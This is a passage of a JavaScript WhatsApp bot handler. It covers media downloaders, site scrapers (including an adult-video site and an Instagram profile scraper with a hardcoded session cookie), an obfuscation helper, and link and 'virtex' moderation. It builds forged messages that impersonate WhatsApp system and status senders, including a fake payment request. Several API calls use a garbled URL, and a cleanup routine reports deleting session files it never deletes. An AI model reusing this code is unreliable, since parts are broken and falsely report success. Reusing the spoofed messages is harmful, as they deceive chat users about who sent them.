	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./data/image/thumb.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await Dare.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Dare.getName(i)}\nFN:${await Dare.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${yt}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "NGN"
			}
		}
	}
}

//let xeonrecordin = ['recording','composing']
//let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]

if (!m.key.fromMe && db.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await Dare.readMessages([readkey]);
}

Dare.sendPresenceUpdate('available', m.chat)

if (global.autoTyping) {
if (command) {
Dare.sendPresenceUpdate('composing', from)
}
}
if (global.autoRecord) {
if (command) {
Dare.sendPresenceUpdate('recording', from)
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await Dare.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await Dare.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}


const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await Dare.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await Dare.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}
//================================================================
if (m.isGroup && !m.key.fromMe && isAutosimi ) {
try {
const ainya = await fetchJson(`https://files.catbox.moe/7rt6v2.jpg IS 𝐁𝐌𝐁 🙂 , 𝐁𝐌𝐁 🙂 &text=$${args.join(" ")}`)
const hangsul = ainya.result
    reply(`${hangsul}`)
  } catch (error) {
    reply(`${error}`)
  }
}
if (m.isGroup && isAutoAiGc) {
try {
const ainya = await fetchJson(`https://files.catbox.moe/7rt6v2.jpg IS 𝐁𝐌𝐁 🙂 , 𝐁𝐌𝐁 🙂 &text=$${args.join(" ")}`)
const hangsul = ainya.result
    reply(`${hangsul}`)
  } catch (error) {
    reply(`${error}`)
  }
}
if (automati) {
  nodecron.schedule('0 */1 * * *', () => {
    process.exit()
  })
}
if (shouldExit) {
    nodecron.schedule('0 */15 * * * *', () => {
        fs.readdir("./session", async function (err, files) {
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
if(filteredArray.length == 0) return console.log(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
await filteredArray.forEach(function (file) {
});
await sleep(2000)
console.log("Successfully deleted all Memories in the session folder")    
});
    })
}
if (!m.key.fromMe && m.isGroup && isnanochat) {
  try {
const ainya = await fetchJson(`https://files.catbox.moe/7rt6v2.jpg IS 𝐁𝐌𝐁 🙂 , 𝐁𝐌𝐁 🙂 &text=$${args.join(" ")}`)
const hangsul = ainya.result
    reply(`${hangsul}`)
  } catch (error) {
    reply(`${error}`)
  }
}
//=================================================================
if (!m.isGroup && !DareTheCreator && db.settings[botNumber].onlygrub ) {
        	if (command){
            return;
            }
        }
//=================================================================
async function makeSticker(media,Sticker, StickerTypes){
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
let jancok = new Sticker(media, {
pack: global.packname, // The pack name
author: global.author, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom('.webp')
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono.path);
await Dare.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
}

async function sendPoll(jid, text, list) {
Dare.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
hasil.push({
link: $(h).find('a').attr('href'),
gambar: $(h).find('img').attr('data-src'),
karakter: $(h).find('div.char-name').text().trim(),
anime: $(h).find('div.anime-title').text().trim(),
episode: $(h).find('div.meta').text(),
up_at: $(h).find('small.meta').text(),
quotes: $(h).find('div.quote').text().trim()
})
            })
            resolve(hasil)
        }).catch(reject)
    })
}


async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
}
}
}

async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
hasil.push({
title: $(b).find('header > h2').text(),
link: $(b).find('header > h2 > a').attr('href'),
category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
type: $(b).find('source').attr('type') || 'image/jpeg',
video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
video_2: $(b).find('video > a').attr('href') || ''
})
            })
            resolve(hasil)
        })
    })
}	

async function GetBuffer(url) {
	return new Promise(async (resolve, reject) => {
		let buffer;
		await jimp
			.read(url)
			.then((image) => {
				image.getBuffer(image._originalMime, function (err, res) {
					buffer = res;
				});
			})
			.catch(reject);
		if (!Buffer.isBuffer(buffer)) reject(false);
		resolve(buffer);
	});
}
function GetType(Data) {
	return new Promise((resolve, reject) => {
		let Result, Status;
		if (Buffer.isBuffer(Data)) {
			Result = new Buffer.from(Data).toString("base64");
			Status = 0;
		} else {
			Status = 1;
		}
		resolve({
			status: Status,
			result: Result,
		});
	});
}
async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
async function Cartoon(url) {
	return new Promise(async (resolve, reject) => {
		let Data;
		try {
			let buffer = await GetBuffer(url);
			let Base64 = await GetType(buffer);
			await axios
				.request({
					url: "https://access1.imglarger.com/PhoAi/Upload",
					method: "POST",
					headers: {
						connection: "keep-alive",
						accept: "application/json, text/plain, */*",
						"content-type": "application/json",
					},
					data: JSON.stringify({
						type: 11,
						base64Image: Base64.result,
					}),
				})
				.then(async ({ data }) => {
					let code = data.data.code;
					let type = data.data.type;
					while (true) {
						let LopAxios = await axios.request({
							url: "https://access1.imglarger.com/PhoAi/CheckStatus",
							method: "POST",
							headers: {
								connection: "keep-alive",
								accept: "application/json, text/plain, */*",
								"content-type": "application/json",
							},
							data: JSON.stringify({
								code: code,
								isMember: 0,
								type: type,
							}),
						});
						let status = LopAxios.data.data.status;
						if (status == "success") {
							Data = {
								message: "success",
								download: {
									full: LopAxios.data.data.downloadUrls[0],
									head: LopAxios.data.data.downloadUrls[1],
								},
							};
							break;
						} else if (status == "noface") {
							Data = {
								message: "noface",
							};
							break;
						}
					}
				});
		} catch (_error) {
			Data = false;
		} finally {
			if (Data == false) {
				reject(false);
			}
			resolve(Data);
		}
	});
}
function randomId() {
	return Math.floor(100000 + Math.random() * 900000);
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function replyprem(teks) {
    reply(`This feature is for premium users, contact the owner to become a premium user`)
}
        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
let mediac = await quoted.download()
await Dare.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return
let mediac = await quoted.download()
await Dare.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
//=========================================\\
// Auto download tiktok
  if (budy.startsWith('https://vt.tiktok.com/') || budy.startsWith('https://www.tiktok.com/') || budy.startsWith('https://t.tiktok.com/') || budy.startsWith('https://vm.tiktok.com/')) {
reply(mess.wait)
try {
  const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(budy)}`)
  const vidnya = data.video.noWatermark
  const caption = `*[ TIKTOK DOWNLOADER ]*

*Video from* _${data.author.name ?? ''} (@${data.author.unique_id ?? ''})_
*Likes*: _${data.stats.likeCount ?? ''}_
*Comments*: _${data.stats.commentCount ?? ''}_
*Shares*: _${data.stats.shareCount ?? ''}_
*Plays*: _${data.stats.playCount ?? ''}_
*Saves*: _${data.stats.saveCount ?? ''}_

\`⏤͟͟͞͞ Downloaded By ${botname}\`
`;
  Dare.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
} catch {
  const response = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(budy)}`)
  const videoUrl = response.result.video;
  const captionn = `*[ TIKTOK DOWNLOADER ]*

Likes: ${response.result.statistics.likeCount ?? ''}
Comments: ${response.result.statistics.commentCount ?? ''}
Shares: ${response.result.statistics.shareCount ?? ''}
by ${response.result.author.nickname ?? ''}

\`⏤͟͟͞͞ Downloaded By ${botname}\`
  `;
  Dare.sendMessage(m.chat, { caption: captionn, video: { url: videoUrl } }, { quoted: m })
}
  }
//=========================================\\
//Auto Download Video Instagram

//=========================================\\
//Auto Download Video Facebook
if(budy.includes('https://www.facebook.com/')){
const fg = require('api-dylux')
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return replydare('Url invalid')
  }
  try {
    const result = await fg.fbdl(budy);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    Dare.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    replydare('Maybe private video!')
  }

}
//=========================================\\
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Dare.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
Dare.sendMessage(m.chat, {
  image: await getBuffer(get_data_respon.image_url),
  caption: get_data_respon.response,
}, {
  quoted: m
})
}
}
//=========================================\\
        // Grup Only
        if (!m.isGroup && !DareTheCreator && db.settings[botNumber].onlygrub ) {
        	if (isCmd){
            return  
            }
        }
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
        let gclink = (`https://chat.whatsapp.com/`+await Dare.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return Dare.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n You will not be kicked by bots because what you sent was a link to this group`})
        if (isAdmins) return Dare.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n Admin sends a link, admin is free to post any link`})
        if (DareTheCreator) return Dare.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n owner has sent a link, owner is free to post any link`})
        kice = m.sender
        await Dare.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
			Dare.sendMessage(from, {text:`\`\`\`「 Tautan Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }            
        }

 // Antiwame by xeon
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DareTheCreator) return reply(bvl)
kice = m.sender
        await Dare.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
Dare.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} have sent the link and it was successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DareTheCreator) return reply(bvl)
kice = m.sender
        await Dare.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
Dare.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} have sent the link and it was successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antivirtex by xeon
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
          await Dare.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
			Dare.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//antilink youtube video by xeon
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DareTheCreator) return reply(bvl)
        await Dare.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
Dare.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by xeon
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DareTheCreator) return reply(bvl)
        await Dare.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
Dare.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by xeon
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DareTheCreator) return reply(bvl)
        await Dare.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
Dare.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DareTheCreator) return reply(bvl)
        await Dare.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
Dare.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin sends a telegram link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DareTheCreator) return reply(bvl)
        await Dare.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
Dare.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Have been kicked for sending a telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin sends TikTok link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DareTheCreator) return reply(bvl)
        await Dare.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
Dare.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Have been kicked for posting tiktok links in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a Twitter link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DareTheCreator) return reply(bvl)
        await Dare.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
Dare.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Have been kicked for posting a twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

Dare.family100 = Dare.family100 ? Dare.family100 : {};
if (from in Dare.family100 && !m.key.fromMe ) {
    let similarity = require('similarity');
    let threshold = 0.72; // semakin tinggi nilai, semakin mirip
    let id = m.chat;
    let users = global.db.users[m.sender];
    let room = Dare.family100[id];
    let text = budy.toLowerCase().replace(/[^\w\s\-]+/, '');
    let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy);

    if (!isSurrender) {
        let index = room.jawaban.indexOf(text);

